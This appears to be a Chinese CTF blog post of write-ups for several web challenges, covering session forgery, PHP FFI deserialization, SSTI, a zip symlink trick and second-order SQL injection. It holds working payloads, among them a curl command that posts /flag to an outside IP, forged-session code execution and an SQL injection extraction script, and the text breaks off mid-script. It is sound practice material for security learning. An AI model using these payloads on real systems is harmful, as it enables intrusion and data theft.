title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2>      <p>代码审计和SESSION文件伪造</p><p>看拿flag的要求是<code>$SESSION[&#39;admin&#39;]==true</code>，在文件下载代码处可看到，生成文章打包后文件和SESSION文件存储在同一文件夹下，可以进行伪造，看文件名处理的代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'-'</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$type</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// avoid path traversal</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token constant">TEMP_DIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此处将文件名命名为<code>用户名-随机8位16进制数.type参数</code>，并且如果有两个.还会将其替换为空，那么我们构造用户名为<code>sess_</code>，type为<code>.</code>最终生成的文件就是<code>sess_-随机8位16进制数</code>，刚好符合SESSION文件存储命名，而又因为下面生成文件使用的是zip方式打包，文本原样写入，我们只需要在文章标题处构造<code>admin|b:1;</code>就能被默认反序列化方式获取，而为了防止前后字符影响，构造标题为<code>xxxx|N;admin|b:1;xxxxxx</code>，通过下载获取SESSID，修改cookie即可</p>        <h2 id="BSidesCF-2019-Pick-Tac-Toe"   >          <a href="#BSidesCF-2019-Pick-Tac-Toe" class="heading-link"><i class="fas fa-link"></i></a><a href="#BSidesCF-2019-Pick-Tac-Toe" class="headerlink" title="[BSidesCF 2019]Pick Tac Toe"></a>[BSidesCF 2019]Pick Tac Toe</h2>      <p>看页面代码，按照对应字符传参可覆盖电脑步数</p>        <h2 id="RCTF-2019-Nextphp"   >          <a href="#RCTF-2019-Nextphp" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h2>      <p>禁用了一堆函数，并且带有openbase_dir，通过glob协议扫出flag在根目录，然后当前目录还有一个php文件，代码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string single-quoted-string">'ret'</span> <span class="token operator">=></span> <span class="token constant">null</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'func'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'print_r'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'arg'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'1'</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处利用的是php7.4新引进的一项特性：<span class="exturl"><a class="exturl__link"   href="https://www.laruence.com/2020/03/11/5475.html" >FFI扩展详解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>总体的FFI调用逻辑就是</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token constant">C</span>中的函数<span class="token function">A</span><span class="token punctuation">(</span><span class="token constant">C</span>中定义函数<span class="token constant">A</span>的参数<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">C</span>中的函数<span class="token function">B</span><span class="token punctuation">(</span><span class="token constant">C</span>中定义函数<span class="token constant">B</span>的参数<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"需要加在的动态库"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">A</span><span class="token punctuation">(</span><span class="token constant">A</span>参数<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>那么在上面的这个序列化内容中我们就可以做如下构造</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string single-quoted-string">'ret'</span> <span class="token operator">=></span> <span class="token constant">null</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'func'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FFI::cdef'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'arg'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'int system(char *command);'</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//此处两个函数需要保留是因为Serializable是一个接口，其中的属性不再次经过声明是不能进行序列化和反序列化的</span>        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于在反序列化时会执行run函数，将FFI调用后的结果传给$data-&gt;ret变量，进而对ret调用即可调用C中的system函数，绕过php的限制，不能直接访问data因为其为保护属性</p><pre class="line-numbers language-none"><code class="language-none">payload:?a&#x3D;$a&#x3D;unserialize(&#39;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#39;);$a-&gt; __serialize()[&#39;ret&#39;]-&gt;system(&#39;curl -d @&#x2F;flag 182.61.46.138:12345&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>        <h2 id="watevrCTF-2019-Supercalc"   >          <a href="#watevrCTF-2019-Supercalc" class="heading-link"><i class="fas fa-link"></i></a><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h2>      <p>合理怀疑SSTI，但是双花括号被过滤了，试试让程序报错，使用1/0，得到报错</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162052551.png"></p><p>那在后面贴上注释，看看里面会不会被执行，传入了没执行</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162053572.png"></p><p>那再传入模版语法试试，成功爆出<code>SECRET_KEY</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162055573.png"></p><p>尝试直接传入提示长度过长，那就伪造session吧</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 *3.py encode <span class="token parameter variable">-s</span> <span class="token string">"cded826a1e89925035cc05f0907855f7"</span> <span class="token parameter variable">-t</span> <span class="token string">'&#123;"history":[&#123;"code":"__import__(\"os\").popen(\"cat flag.txt\").read()"&#125;]&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="SWPU2019-Web3"   >          <a href="#SWPU2019-Web3" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2>      <p>伪造session，访问个404的网站，可以拿到<code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code></p><p>ID处base64解码发现是100，伪造成1试试</p><pre class="line-numbers language-none"><code class="language-none">python3 *3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &#39;&#123;&quot;id&quot;:&#123;&quot;b&quot;:&quot;1&quot;&#125;,&quot;is_login&quot;:True,&quot;password&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#39; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进去了，有源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'1'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">'POST'</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        name <span class="token operator">=</span> name<span class="token operator">+</span><span class="token string">'qweqweqwe'</span>        name <span class="token operator">=</span> name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        md5_one<span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        n <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        ip <span class="token operator">=</span> ip<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        n<span class="token punctuation">.</span>update<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        md5_ip <span class="token operator">=</span> n<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        f<span class="token operator">=</span>request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        basepath<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>md5_one<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/"</span>        path_base <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span>        filename <span class="token operator">=</span> f<span class="token punctuation">.</span>filename        pathname <span class="token operator">=</span> path<span class="token operator">+</span>filename        <span class="token keyword">if</span> <span class="token string">"zip"</span> <span class="token operator">!=</span> filename<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'zip only allowed'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cmd <span class="token operator">=</span> <span class="token string">"unzip -n -d "</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span> pathname            <span class="token keyword">if</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>waf<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>        unzip_file <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>pathname<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>        unzip_filename <span class="token operator">=</span> unzip_file<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'is_login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'not login'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> unzip_filename<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token operator">+</span>unzip_filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>            resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>            <span class="token keyword">return</span> resp        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/showflag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">showflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./flag/flag.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>        <span class="token keyword">return</span> resp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"can't give you"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大概流程就是，上传一个zip压缩的图片，然后解压并返回内容展示，看到下面flag在<code>./flag/flag.jpg</code>中，伪造软连接</p><pre class="line-numbers language-none"><code class="language-none">zip命令中-y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将其上传即可</p>        <h2 id="网鼎杯2018-Unfinish"   >          <a href="#网鼎杯2018-Unfinish" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2>      <p>二次注入啊二次注入</p><p>偷个脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64   <span class="token comment"># 用来解16进制</span><span class="token keyword">import</span> re       <span class="token comment"># 正则匹配</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://a13c51eb-d523-492b-82c0-82566d5c46a1.node4.buuoj.cn:81/"</span>payload<span class="token operator">=</span><span class="token string">"0'+(hex(hex((substr((select * from flag) from &#123;&#125; for 3)))))+'0"</span> <span class="token comment">## 必须保证有flag表，且flag表里只有一行一列，多列需要使用group_concat来连接</span>result<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">def</span> <span class="token function">fund</span><span class="token punctuation">(</span>txt<span class="token punctuation">)</span><span class="token punctuation">:</span>    t <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;span class=\"user-name\">\n(.*?)&lt;/span>"</span><span class="token punctuation">,</span> txt<span class="token punctuation">)</span>    t <span class="token operator">=</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">int</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment"># t=base64.b16decode(t)</span>    <span class="token comment"># t = base64.b16decode(t).decode("ascii")</span>    t<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment">### 必须要求t为 str</span>    t<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment">### bytes.fromhex 返回结果是bytes类型的</span>    <span class="token comment"># print(t)</span>    <span class="token keyword">global</span> result    result<span class="token operator">+=</span>t<span class="token keyword">for</span>  a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    register<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"1112223@1123111"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"123"</span>    <span class="token punctuation">&#125;</span>    login<span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"1112223@1123111"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span>     <span class="token punctuation">&#125;</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    r1<span class="token operator">=</span>r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token 